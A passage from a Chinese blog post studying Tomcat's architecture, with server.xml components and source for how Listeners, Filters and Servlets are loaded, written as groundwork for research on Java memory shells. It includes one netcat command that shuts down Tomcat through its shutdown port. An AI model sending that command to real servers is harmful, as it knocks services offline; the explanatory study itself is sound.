[{"content":"Tomcat框架以及与Servlet之间的联系 写在前面 最近一直都说想学Java内存马，但也一直都停在Tomcat内存马这里，原因就是很多的教程都建议要掌握一下Tomcat的框架，但是迫于一直都没有找到好的教程和文章来看，如果只是单纯地给每个模块下一个定义，感觉很难说服自己懂了。 虽然很想从头看一遍《How Tomcat Works》但是确实也不现实，偶然一个机会需要找一下Tomcat的 server.xml 配置文件来看一下，又碰巧找到了一篇解读 server.xml 的文章，于是就有了这篇文章或者说学习笔记。 在本文中，我们将一起学习以下内容： 通过解读一个基础的Tomcat server.xml 配置文件，了解Tomcat下面的组件是如何分工处理一个HTTP请求的； 进而了解Tomcat下各个组件的作用，以及它们之间的关系； 最后尝试通过Tomcat以及Java EE源码来了解一下Tomcat是如何与Java EE中的三大组件（Servlet，Filter，Listener）是如何关联起来的； Tomcat基础框架 Tomcat作为一个Web应用服务器，其最核心的功能自然就是： 接受来自用户的HTTP request请求; 根据用户的HTTP请求进行业务处理： 最后返回Response响应给用户 在接下来的文章中，记住这个最基本的功能可以让我们更好的理解Tomcat到底是怎么来对HTTP请求进行处理的。 Figure 1: Tomcat框架\n我们先来根据上图看一下最简单的Tomcat server框架，其中包含了很多陌生的抽象名词，大家不要着急，后面我们会具体展开来讲： 一个Tomcat服务器包含多个Service; 一个Service可以绑定 多个 Connector，并同时与 唯一 一个Container绑定; Connector 负责处理由客户端发出的HTTP请求，并封装成ServletRequest对象发送给Container进行处理; Container 负责对收到的请求（ServletRequest对象）进行处理，并将响应Response封装成ServletResponse对象发回Connector; 最后由Connector发送HTTP响应返回给客户端，至此完成一次HTTP请求与响应。 从Tomcat配置文件server.xml了解Tomcat server.xml是Tomcat服务器的配置文件，其中的每一个xml元素都代表了tomcat中的一个组件，这些组件都在处理请求中拥有自己的职责，我们通过对配置文件的解读学习，可以大致了解Tomcat服务器的整体架构组成，有助于我们进一步的源码阅读； Tomcat的配置文件server.xml的整体结构如下： \u0026lt;Server\u0026gt; \u0026lt;Service\u0026gt; \u0026lt;Connector /\u0026gt; \u0026lt;Connector /\u0026gt; \u0026lt;Engine\u0026gt; \u0026lt;Host\u0026gt; \u0026lt;Context /\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; \u0026lt;/Server\u0026gt; 接下来我们讲一个个元素来进行理解，并了解这些元素所配置的Tomcat组件的功能； Server \u0026lt;Server\u0026gt;元素是配置文件的根元素，用来代表着我们整一个Tomcat服务器； 根据上面的框架图我们知道，一个Tomcat Server可以包含多个Service，而Server的主要任务，就是为客户端提供了一个能够访问所有这些Service的接口，同时维护所有Service的生命周期，包括如何找到客户端想要访问的Service： \u0026lt;Server port=\u0026#34;8005\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt; \u0026lt;/Server\u0026gt; 上面的这个实例包含了两个属性，port以及shutdown，这两个属性组合在一起表示，当我们向8005端口发送\u0026quot;SHUTDOWN\u0026quot;这个信息时，服务器就会关闭（当shutdown的属性设为-1时就可以禁用这个功能） 如果大家用过nc或者ncat的话，就不难想到我们可以使用nc来创建一个client socket去连接8005端口并发出指令关闭端口： nc localhost 8005 SHUTDOWN Service Tomcat框架中的这个Service，我认为是和我们传统意义上的Service是一个概念，即监听一个端口，与客户端建立连接来进行通信交互； 一般来说，默认只开启一个名叫Catalina的Service，也就是最核心的Web容器，当然Tomcat也可以提供多个Service，但是一般来说用不上，我们只要知道根据name属性，Catalina就是Tomcat server下面的一个Service就可以了： \u0026lt;Service name=\u0026#34;Catalina\u0026#34;\u0026gt; \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; \u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; Connector \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; \u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; 我们之前提到过Service包含多个Connector和唯一的Container，我们在上面的配置中，发现了两个Connector元素监听了不同的端口，可这就让Service的概念不是不同了吗？ 其实仔细看，可以发现两个Connector都使用了不同的协议，HTTP/1.1 以及 AJP/1.3； 我们接着看看元素内的属性，port，protocol就是Connector所监听的端口，我们可以看到这里使用了8080，而不是传统的80端口，这是因为： “在正式的生产环境中，Tomcat也常常监听8080端口，而不是80端口。这是因为在生产环境中，很少将Tomcat直接对外开放接收请求，而是在Tomcat和客户端之间加一层代理服务器(如nginx)，用于请求的转发、负载均衡、处理静态文件等；通过代理服务器访问Tomcat时，是在局域网中，因此一般仍使用8080端口。” 而配置了第二个AJP协议的Connector连接器是因为Tomcat作为Servlet容器，对于静态资源处理速度相对较慢，因此可以用AJP协议与Apache等服务器连接，让Apache等服务器来处理静态资源； 静态资源 静态资源就是服务器不需要经过任何处理就可以直接返回给用户的内容，例如HTML页面，Flash，JavaScript图片等内容； 相对的，动态资源就是例如ASP、PHP、JSP等文件，需要经过服务器处理之后，然后再返回给用户； 为什么我们要用Apache等HTTP服务器来处理静态资源？ 我们知道Tomcat会使用Connector连接器对客户端发来的HTTP请求进行解析，然后转换成Request以及Response对象进行处理之后再返回给客户端； 但如果是静态资源，根本不需要服务器进行任何处理，如果每次碰到静态资源，例如图片啊，JS这样的资源如果还问Tomcat来要，那就会浪费时间在对于所有这些HTTP请求的无用的解析和构造对象上了； 而AJP(Apache JServ Protocol) 是一个二进制的协议，并且与Tomcat服务器建立一个永久的连接，这两点都极大地提高了通信的效率; Figure 2: Tomcat与Apache集成\n总结一下，Connector的主要功能就是提供一个接口，来接收所有来自客户端的HTTP请求，并将HTTP Request以及Response封装成ServletRequest对象发送给Container进行处理; 我们在开头说过，我们要关注Tomcat本质上是来处理客户端传来的HTTP请求，我们接下来就拿一个例子来具体介绍： URL： http://localhost:8080/LearnFilter_war/admin/a.jsp HTTP请求： GET /LearnFilter_war/admin/a.jsp HTTP/1.1 Host: localhost:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 直到Connector进行处理，我们的请求首先已经经历这些处理（暂时不考虑nginx反向代理）： localhost经过了本机默认的DNS服务器，被解析成了127.0.0.1，然后建立了一个client socket并尝试与服务器的8080端口建立连接； Tomcat的HTTP Connector连接器接收到了HTTP请求，并将请求转换为ServletRequest以及对应的ServletResponse对象传递给Container。 Container \u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; Container? 谁是Container？哪里有Container，配置文件里没看到啊？ 我们之前介绍的Container容器其实都是一个抽象的概念，其实真正在使用的都是继承了Container接口的所有子类，包括Engine，Host，Context以及Wrapper； Figure 3: Container 类层次\n接下来我们会依次介绍他们的作用，不过就和之前介绍的那样，整一个Container模块的功能就是处理请求以及构造响应。 Engine与Host 一个Service只包含一个Engine；一个Engine与Service中的多个Connector进行绑定；同时一个Engine可以内嵌一个或多个Host（即Host是Engine的子容器）； Engine是最顶层的Container（容器），而Host作为子容器，表示Engine中的一个虚拟主机，对应了服务器中的网络实体名（例如域名或者IP地址）； 客户端通过主机名来标识他们想要连接的主机，主机名会作为 HOST Header被放在HTTP请求中，Engine会根据HTTP Header中Host的值决定由哪一个HOST来继续处理请求。 \u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;Host name=\u0026#34;anotherHost\u0026#34; appbase=\u0026#34;otherApps\u0026#34;\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; 在Engine元素的属性中: name属性用于用户日志和错误信息，在整个Server中应该保持唯一； defaultHost表示如果HTTP请求中的HOST Header的值与所有的Host元素都不匹配，默认交由defaultHost所设定的Host处理； 最后再说明一下Host的配置属性： name表示Tomcat上虚拟主机的主机名，一般来说主机名是DNS服务器中已经注册的域名（当然defaultHost不需要，只要保证能接受到就好了）； unpackWARs指示了是否要将代表Web应用的WAR文件解压： 如果为true，则解压之后再运行web应用 如果为false，则直接使用WAR文件运行Web应用 autoDeploy以及appBase属性我们放到后面Web应用自动部署再介绍，先知道appBase就表示存放Web应用的目录就可以了 最后回到我们的HTTP请求的例子（当然这时候这些数据都是从Connector整合的ServletRequest对象中获取了）： GET /LearnFilter_war/admin/a.jsp HTTP/1.1 Host: localhost:8080 ... ... 至此我们就知道了一个Tomcat服务器可以有唯一一个公网IP，而客户端可以通过多个域名（localhost, anotherHost）来访问服务器（只要DNS能够解析到对应的IP地址即可），然后Engine会根据HTTP请求中的HOST头将请求分配给对应的HOST组件，比如我们的例子中的localhost这个HOST。 Context 我们继续套娃，一个Service有唯一一个Engine，一个Engine内嵌一个或者多个Host，而一个Host则可以内嵌一个多个Context，用来表示一个虚拟主机HOST下所运行的一个或者多个Web应用程序（同样也是子容器）； 我们知道Host具体的表现形式就是HOST Header，而Context的具体表现形式就是我们在HTTP请求中的URI，在我们的例子中就是 LearnFilter_war; 这个URI其实也就是我们在使用IDEA开发的时候，创建的项目名，记得我们在Servlet的介绍中，曾经说过一个web项目，只有一个ServletContext对象吗，记住这一点，我们在将Wrapper的时候还会再提到（其实Wrapper就是我们所开发的一个个Servlet）； 在知道了这些内容之后，你可能最想问的还是，为什么我没有在server.xml中看到Context元素啊？ 原因就是我们在Host的配置中开启了自动部署（autoDeploy=true），在这个场景下，Tomcat会自动匹配URI的path与 appBase 属性中的目录名称进行匹配，一旦匹配上则默认这个目录就是要继续处理请求的Context，也就不需要再进行额外配置的： \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34; deployOnstartup=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/Host\u0026gt; 如果deployOnStartup和autoDeploy设置为true，则tomcat启动自动部署： 当检测到新的Web应用或Web应用的更新时，会触发应用的部署(或重新部署)。 二者的主要区别在于: deployOnStartup为true时，Tomcat在启动时检查Web应用，且检测到的所有Web应用视作新应用； autoDeploy为true时，Tomcat在运行时定期检查新的Web应用或Web应用的更新。除此之外，二者的处理相似。 下面的这些Web应用都可以直接使用localhost:8080/xxx进行访问： Figure 4: webpas目录下的Context Web应用\n我们也可以手动配置静态Context元素，其中 path 表示URI， docBase 表示Web应用的war文件或者目录的位置，而 reloadable 属性则表示当class文件发生改动时，是否要触发整个Web应用的重新加载： \u0026lt;Context path=\u0026#34;/\u0026#34; docBase=\u0026#34;other_directory_absolute_path/app1.war\u0026#34; reloadable=\u0026#34;true\u0026#34;/\u0026gt; 但是一般不建议使用静态配置，因为 server.xml 这个文件在修改后需要重新启动服务器才能加载，因此一旦需要修改Path的信息，就需要重启服务器，而在自动部署的时候Tomcat就可以通过定期的扫描了检查Web应用的路径是否发生了修改； 至此，我们想要根据 server.xml 所获取的组件元素信息已经全部介绍完毕，但是Container作为处理HTTP请求的容器，肯定和我们在Java Web编程中的核心组件Servlet时分不开的，而Servlet其实是被Container的最底层子类Wrapper所包裹使用，我们将在下面的章节中介绍。 Wrapper Wrapper是Context的子容器，也是Tomcat的最底层容器了，我们知道一个Context代表一个Web应用，那么一个Wrapper就代表一个Web应用下的一个个功能组件，也就是我们之前介绍过的Servlet：一个Wrapper就是一个Servlet的封装。 在我们介绍Tomcat三大组件：Servlet，Filter以及Lisntener的时候我们都介绍了这些组件的一个生命周期，包括init(), destroy()方法，而Wrapper就是来管理Servlet的生命周期的： void load() throws ServletException Load and initialize an instance of this Servlet, if there is not already at least one initialized instance. This can be used, for example, to load Servlets that are marked in the deployment descriptor to be loaded at server startup time. 在StandardWrapper的load()方法中使用loadServlet来初始化一个Servlet，接着再用initServlet来初始化这个Servlet: public synchronized void load() throws ServletException { this.instance = this.loadServlet(); if (!this.instanceInitialized) { this.initServlet(this.instance); } ... ... } 接着我们具体来看这两个方法： public Servlet loadServlet() throws ServletException Load and initialize an instance of this servlet, if there is not already at least one initialized instance. This can be used, for example, to load servlets that are marked in the deployment descriptor to be loaded at server startup time. Returns: the loaded Servlet instance StandardWrapper对象的loadServlet()先是获取了其父容器StandardContext来加载这个Servlet类，再利用initServetlet()来进行初始化： public synchronized Servlet loadServlet() throws ServletException { ... ... InstanceManager instanceManager = ((StandardContext)this.getParent()).getInstanceManager(); try { servlet = (Servlet)instanceManager.newInstance(this.servletClass); } this.initServlet(servlet); this.fireContainerEvent(\u0026#34;load\u0026#34;, this); this.loadTime = System.currentTimeMillis() - t1; var12 = false; return servlet; } 而initServlet(Servlet servlet)做的最重要的一件事情就是调用了servlet的init()方法，开启了其生命周期 private synchronized void initServlet(Servlet servlet) throws ServletException { if (!this.instanceInitialized || this.singleThreadModel) { try { if (Globals.IS_SECURITY_ENABLED) { boolean success = false; try { Object[] args = new Object[]{this.facade}; SecurityUtil.doAsPrivilege(\u0026#34;init\u0026#34;, servlet, classType, args); success = true; } finally { if (!success) { SecurityUtil.remove(servlet); } } } else { servlet.init(this.facade); } this.instanceInitialized = true; } ... ... } } 至此，Tomcat服务器也就和我们使用Java EE定义和创建的Servlet联系起来了，我们也能绘制出整一个container的子容器之间的关系了： Figure 5: Tomcat Container子容器结构\nTomcat中的三种Context，StandardContext, ApplicationContext以及ServletContext 既然我们说到了Servlet是如何与Tomcat服务器结合起来使用的，那自然当然也少不了Filter以及Listener，我们就借此机会，来好好说道说道Context； 如果大家了解过Servlet的开发，那就一定知道一个概念就是ServletContext，这和Tomcat组件中的Context会不会有什么联系呢？ org.apache.catalina.Context org.apache.catalina.core.StandardContext jakarta.servlet.ServletContext org.apache.catalina.core.ApplicationContext org.apache.catalina.core.ApplicationContextFacade 上面我们一共提到了5中Context，我们依次先来简单认识一下，之后再展开讲他们的具体关系： org.apache.catalina.Context接口： 定义了Tomcat中的Context容器，其父容器为Host，其子容器为Wrapper； 用来表示一个Web应用 org.apache.catalina.core.StandardContext类： 是org.apache.catalina.Context接口的标准实现 之后方便辨认，我们统一用StandardContext来表示Context接口以及实现类 jakarta.servlet.ServletContext接口 定义了一系列servlet可以用来与servlet容器通信的方法； 每一个JVM中的每一个web应用都有唯一一个ServletContext（web应用直观的来说就是表示访问服务器所用的URL中所跟着的URI例如/catalog，并且整个应用可能就是一个 .war 文件）； 细心的师傅应该发现了这个接口是在JAVA EE的包里定义了，和其他在org.apache.catalina中定义的不同，这是Java EE先提供的接口，来帮助web应用中的Servlet存储数据，进行通信； org.apache.catalina.core.ApplicationContext类： 这个类就是Tomcat对于ServletContext的具体实现； org.apache.catalina.core.ApplicationContextFacade类： 这个类是ApplicationContext的一个门面类，可以理解为讲ApplicationContext的属性和方法封装在这个Facade门面类里面，对外就调用Facade中的方法就可以了（具体可以参考：JAVA设计模式之门面模式（外观模式）） 这样讲其实还挺割裂的，好像两个实现类StandardContext以及ApplicationContext没有什么直接的联系，但是事实上他们却有着千丝万缕的联系： StandardContext中就有一个 getServletContext() 方法，我们可以观察到，其中生成的就是ServletContext的实现类 ApplicationContext, 同时返回值就是ApplicationContext的门面类的对象： public class StandardContext extends ContainerBase implements Context, NotificationEmitter { protected ApplicationContext context = null; public ServletContext getServletContext() { if (this.context == null) { this.context = new ApplicationContext(this); if (this.altDDName != null) { this.context.setAttribute(\u0026#34;org.apache.catalina.deploy.alt_dd\u0026#34;, this.altDDName); } } return this.context.getFacade(); } } 上面的代码还有值得注意的一点，就是ApplicationContext的构造器使用了StandardContext的对象，我们接着去看看ApplicationContext的源码： public class ApplicationContext implements ServletContext { public ApplicationContext(StandardContext context) { this.context = context; this.service = ((Engine)context.getParent().getParent()).getService(); this.sessionCookieConfig = new ApplicationSessionCookieConfig(context); this.populateSessionTrackingModes(); } } 我们发现在ApplicationContext中， this.context 竟然是StandardContext的对象，我们接着查找 this.context 的使用情况，发现了有很大一部分的方法中都在使用了这个 StandardContext 的对象： Figure 6: this.context在ApplicationContext中的使用情况\nFigure 7: 76处使用context\nFigure 8: 47处调用了StandardContext的get方法\nFigure 9: 调用StandardContext的事件触发方法\n我们隐约可以感觉到ServletContext就像是StandaardContext下属的一个部门，负责管理Servlet的一些事务，但是都要向StandardContext进行汇报以及获取物资的感觉。 StandardContext是如何启动Tomcat三大组件：Servlet，Filter以及Listener的？ 接着我们来具体看看StandardContext是启动Tomcat的三大组件，借此进一步了解Tomcat所定义的Context与Java EE自带的这三大组件是如何协调工作的： ContextConfig.configureContext() 与 StandardContext.startInternal() 首先，我们要问第一个问题: StandardContext是怎么知道应该加载哪些Servlet, Filter以及Listener的？ 答案其实很容易就可以猜到，就是从web.xml或者annotation中读取： 我们看到下面的这个 configureContext() 方法中，通过获取一个webxml对象，然后从中分别读取了这三大组件的相关配置内容： private void configureContext(WebXml webxml) { for (Entry\u0026lt;String, String\u0026gt; entry : webxml.getContextParams().entrySet()) { context.addParameter(entry.getKey(), entry.getValue()); } // 加载Filter的配置 for (FilterDef filter : webxml.getFilters().values()) { if (filter.getAsyncSupported() == null) { filter.setAsyncSupported(\u0026#34;false\u0026#34;); } context.addFilterDef(filter); } for (FilterMap filterMap : webxml.getFilterMappings()) { context.addFilterMap(filterMap); } // 加载Listner的配置 for (String listener : webxml.getListeners()) { context.addApplicationListener(listener); } // 加载Servlet的配置 for (ServletDef servlet : webxml.getServlets().values()) { Wrapper wrapper = context.createWrapper(); if (servlet.getLoadOnStartup() != null) { wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); } if (servlet.getEnabled() != null) { wrapper.setEnabled(servlet.getEnabled().booleanValue()); } wrapper.setName(servlet.getServletName()); Map\u0026lt;String,String\u0026gt; params = servlet.getParameterMap(); for (Entry\u0026lt;String, String\u0026gt; entry : params.entrySet()) { wrapper.addInitParameter(entry.getKey(), entry.getValue()); } wrapper.setRunAs(servlet.getRunAs()); Set\u0026lt;SecurityRoleRef\u0026gt; roleRefs = servlet.getSecurityRoleRefs(); for (SecurityRoleRef roleRef : roleRefs) { wrapper.addSecurityReference( roleRef.getName(), roleRef.getLink()); } wrapper.setServletClass(servlet.getServletClass()); wrapper.setOverridable(servlet.isOverridable()); context.addChild(wrapper); } for (Entry\u0026lt;String, String\u0026gt; entry : webxml.getServletMappings().entrySet()) { context.addServletMappingDecoded(entry.getKey(), entry.getValue()); } } 加载配置完毕之后，接下来就是我们在介绍Filter以及Listener中的文章中曾经介绍过，StandardContext通过 startInternal() 这个方法来依次启动加载 Listener, Filter 以及 Servlet: protected synchronized void startInternal() throws LifecycleException { ... ... try { ... ... // 1. ListenerStart(), 启动加载Listener if (ok \u0026amp;\u0026amp; !this.listenerStart()) { log.error(sm.getString(\u0026#34;standardContext.listenerFail\u0026#34;)); ok = false; } // 2. filterStart(), 启动加载Filter if (ok \u0026amp;\u0026amp; !this.filterStart()) { log.error(sm.getString(\u0026#34;standardContext.filterFail\u0026#34;)); ok = false; } // 3. loadOnStartup(), 启动加载Servlet if (ok \u0026amp;\u0026amp; !this.loadOnStartup(this.findChildren())) { log.error(sm.getString(\u0026#34;standardContext.servletFail\u0026#34;)); ok = false; } super.threadStart(); ... ... } 下面就让我们来针对每一个组件来看StandardContext是如何读取配置，如何初始化和加载对象的： Listener 加载Listener配置\n通过ContextConfig.configureContext从 web.xml 中向StandardContext加载listener配置： private void configureContext(WebXml webxml) { // 加载Listner的配置 for (String listener : webxml.getListeners()) { context.addApplicationListener(listener); } } 其中，StandardContext.addApplicationListener() 方法来将Listener的类名到StandardContext中的一个字符串数组 applicationListeners 中： private String applicationListeners[] = new String[0]; @Override public void addApplicationListener(String listener) { synchronized (applicationListenersLock) { String results[] = new String[applicationListeners.length + 1]; for (int i = 0; i \u0026lt; applicationListeners.length; i++) { if (listener.equals(applicationListeners[i])) { log.info(sm.getString(\u0026#34;standardContext.duplicateListener\u0026#34;,listener)); return; } results[i] = applicationListeners[i]; } results[applicationListeners.length] = listener; applicationListeners = results; } fireContainerEvent(\u0026#34;addApplicationListener\u0026#34;, listener); } 初始化和加载Listener\n接着我们来看在StandardContext.startInternal()中是如何初始化Listener的： listenerStart()是用来将所有我们在Web工程中所定义的Listeners进行初始化的方法，它先是从StandardContext的private属性applicationListeners这样一个字符串变量中拿到所有需要加载的Listeners的名字，接着用 this.getInstanceManager().newInstance(listener) 的形式来进行加载。 /** * Configure the set of instantiated application event listeners * for this Context. * * @return \u0026lt;code\u0026gt;true\u0026lt;/code\u0026gt; if all listeners wre * initialized successfully, or \u0026lt;code\u0026gt;false\u0026lt;/code\u0026gt; otherwise. */ private String[] applicationListeners = new String[0]; public boolean listenerStart() { ... ... String[] listeners = this.findApplicationListeners(); Object[] results = new Object[listeners.length]; boolean ok = true; for(int i = 0; i \u0026lt; results.length; ++i) { ... ... try { String listener = listeners[i]; results[i] = this.getInstanceManager().newInstance(listener); } ... ... } ... ... } 我们最后来看这个 newInstance() 是如何来加载listener的，如果看过我们有关Java反射的文章或者了解反射的师傅应该很快就能反应过来，这个方法就是通过Java反射机制来根据Listener的类名来生成一个新的Listener对象： @Override public Object newInstance(final String className, final ClassLoader classLoader) throws IllegalAccessException, NamingException, InvocationTargetException, InstantiationException, ClassNotFoundException, IllegalArgumentException, NoSuchMethodException, SecurityException { Class\u0026lt;?\u0026gt; clazz = classLoader.loadClass(className); return newInstance(clazz.getConstructor().newInstance(), clazz); } 其实通过这个例子，我们也能理解到使用反射的妙处了，就是无论你创建的Listener叫什么名字，只要你往配置里写好，就可以自动进行加载以及利用； 同时，如果你修改了这个类的名字，那也只需要修改一下配置文件里修改一下就好了，不需要去一个个改源码。 Filter 加载Filter相关配置\nprivate void configureContext(WebXml webxml) { // 加载Filter的配置 for (FilterDef filter : webxml.getFilters().values()) { if (filter.getAsyncSupported() == null) { filter.setAsyncSupported(\u0026#34;false\u0026#34;); } context.addFilterDef(filter); } for (FilterMap filterMap : webxml.getFilterMappings()) { context.addFilterMap(filterMap); } } 我们可以看到 configureContext() 在对filter进行处理的时候，添加了两个内容：FilterDef以及FilterMap，这也就对应了我们在开发的过程中注册一个filter需要在 web.xml 中完成的配置：\u0026lt;filter\u0026gt;以及\u0026lt;filter-mapping\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;HelloFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;pers.javasec.javafilter.HelloFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;HelloFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/admin/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 接着我们可以根据StandardContext中两个具体的add方法看到，他们都是将得到配置信息分别存入HashMap当中： /** * Add a filter definition to this Context. * * @param filterDef The filter definition to be added */ @Override public void addFilterDef(FilterDef filterDef) { synchronized (filterDefs) { filterDefs.put(filterDef.getFilterName(), filterDef); } } /** * Add a filter mapping to this Context at the end of the current set * of filter mappings. * * @param filterMap The filter mapping to be added * * @exception IllegalArgumentException if the specified filter name * does not match an existing filter definition, or the filter mapping * is malformed */ @Override public void addFilterMap(FilterMap filterMap) { validateFilterMap(filterMap); // Add this filter mapping to our registered set filterMaps.add(filterMap); fireContainerEvent(\u0026#34;addFilterMap\u0026#34;, filterMap); } 初始化和加载Filter\n我们在上面的filter配置加载中看到了StandardContext会存放每一个filter的基本信息在 filterDefs 中。 那么在接着来看StandardContext在初始化和加载Filter的过程中，就是通过读取 filterDefs 中的filter信息，接着为每一个filter都创建一个filterconfig对象，并存入hashmap filterConfigs 中： /** * The set of filter configurations (and associated filter instances) we * have initialized, keyed by filter name. */ private HashMap\u0026lt;String, ApplicationFilterConfig\u0026gt; filterConfigs = new HashMap\u0026lt;\u0026gt;(); /** * The set of filter definitions for this application, keyed by * filter name. */ private HashMap\u0026lt;String, FilterDef\u0026gt; filterDefs = new HashMap\u0026lt;\u0026gt;(); filterStart(): /** * Configure and initialize the set of filters for this Context. * @return \u0026lt;code\u0026gt;true\u0026lt;/code\u0026gt; if all filter initialization completed * successfully, or \u0026lt;code\u0026gt;false\u0026lt;/code\u0026gt; otherwise. */ public boolean filterStart() { // Instantiate and record a FilterConfig for each defined filter boolean ok = true; synchronized (filterConfigs) { filterConfigs.clear(); for (Entry\u0026lt;String,FilterDef\u0026gt; entry : filterDefs.entrySet()) { String name = entry.getKey(); if (getLogger().isDebugEnabled()) { getLogger().debug(\u0026#34; Starting filter \u0026#39;\u0026#34; + name + \u0026#34;\u0026#39;\u0026#34;); } try { // 为每一个filterDef都创建一个filterConfig ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, entry.getValue()); // 将创建的filterConfig存入filterConfigs中 filterConfigs.put(name, filterConfig); } catch (Throwable t) { t = ExceptionUtils.unwrapInvocationTargetException(t); ExceptionUtils.handleThrowable(t); getLogger().error(sm.getString( \u0026#34;standardContext.filterStart\u0026#34;, name), t); ok = false; } } } return ok; } Servlet 加载Servlet相关配置\n最后我们来看看Servlet，处理的语句明显变多了； \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;MyServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;pers.medic.jsplearn.MyServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;username\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;root\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;MyServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/my\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 对于所有Servlet的配置，configureContext都会为其单独建立一个Wrapper来进行封装； 并且这些Wrapper会被当作子容器通过 addChild() 被嵌入 StandardContext 当中； private void configureContext(WebXml webxml) { // 加载Servlet的配置 for (ServletDef servlet : webxml.getServlets().values()) { // 将每一个\u0026lt;servlet\u0026gt;配置都封装到Wrapper中去 Wrapper wrapper = context.createWrapper(); wrapper.setName(servlet.getServletName()); // 将当前\u0026lt;servlet\u0026gt;下的所有存储的params变量信息进行加载 Map\u0026lt;String,String\u0026gt; params = servlet.getParameterMap(); for (Entry\u0026lt;String, String\u0026gt; entry : params.entrySet()) { wrapper.addInitParameter(entry.getKey(), entry.getValue()); } wrapper.setRunAs(servlet.getRunAs()); wrapper.setServletClass(servlet.getServletClass()); context.addChild(wrapper); } // 增加\u0026lt;servlet-mapping\u0026gt;中的信息 for (Entry\u0026lt;String, String\u0026gt; entry : webxml.getServletMappings().entrySet()) { context.addServletMappingDecoded(entry.getKey(), entry.getValue()); } } 初始化和加载Servlet\nloadOnStartup是StandardContext中用来启动所有注册的Servlet（Wrapper）的方法，我们主要关注下半部分的for循环中，可以看到 wrapper.load() 就是用来启动Wrapper的： /** * Load and initialize all servlets marked \u0026#34;load on startup\u0026#34; in the * web application deployment descriptor. * * @param children Array of wrappers for all currently defined * servlets (including those not declared load on startup) * @return \u0026lt;code\u0026gt;true\u0026lt;/code\u0026gt; if load on startup was considered successful */ public boolean loadOnStartup(Container children[]) { // Collect \u0026#34;load on startup\u0026#34; servlets that need to be initialized TreeMap\u0026lt;Integer, ArrayList\u0026lt;Wrapper\u0026gt;\u0026gt; map = new TreeMap\u0026lt;\u0026gt;(); for (Container child : children) { Wrapper wrapper = (Wrapper) child; int loadOnStartup = wrapper.getLoadOnStartup(); if (loadOnStartup \u0026lt; 0) { continue; } Integer key = Integer.valueOf(loadOnStartup); ArrayList\u0026lt;Wrapper\u0026gt; list = map.get(key); if (list == null) { list = new ArrayList\u0026lt;\u0026gt;(); map.put(key, list); } list.add(wrapper); } // Load the collected \u0026#34;load on startup\u0026#34; servlets for (ArrayList\u0026lt;Wrapper\u0026gt; list : map.values()) { for (Wrapper wrapper : list) { try { wrapper.load(); } catch (ServletException e) { getLogger().error(sm.getString(\u0026#34;standardContext.loadOnStartup.loadException\u0026#34;, getName(), wrapper.getName()), StandardWrapper.getRootCause(e)); // NOTE: load errors (including a servlet that throws // UnavailableException from the init() method) are NOT // fatal to application startup // unless 